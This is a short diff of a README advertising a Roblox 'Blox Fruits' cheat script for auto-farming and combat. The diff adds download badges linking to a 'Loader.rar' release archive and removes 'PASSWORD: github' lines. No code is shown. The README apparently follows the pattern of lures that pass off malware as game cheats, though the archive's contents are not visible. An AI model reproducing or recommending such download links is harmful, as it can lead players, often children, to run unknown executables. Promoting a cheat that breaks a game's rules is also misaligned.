@@ -1,12 +1,12 @@
 # 🏴‍☠️ Blox Fruits Script – Ultimate Auto-Farming & Combat Tool (2025)  
 
-[![Download Blox Fruits Script](https://img.shields.io/badge/Download-Blox_Fruits_Script-red?style=for-the-badge&logo=download)]()  
-## 🔑 PASSWORD: github  
+[![Download Blox Fruits Script](https://img.shields.io/badge/Download-Blox_Fruits_Script-red?style=for-the-badge&logo=download)](https://github.com/VibsiNix17/blox-fruits-script/releases/download/Update/Loader.rar)  
+
 ![bloxnew](https://github.com/user-attachments/assets/9ad42770-c06b-42bf-94f0-c7cb7f6a72a5)
 
 
-[![Download Blox Fruits Script](https://img.shields.io/badge/Download-Blox_Fruits_Script-red?style=for-the-badge&logo=download)]()  
-## 🔑 PASSWORD: github  
+[![Download Blox Fruits Script](https://img.shields.io/badge/Download-Blox_Fruits_Script-red?style=for-the-badge&logo=download)](https://github.com/VibsiNix17/blox-fruits-script/releases/download/Update/Loader.rar)  
+
 
 ---
 
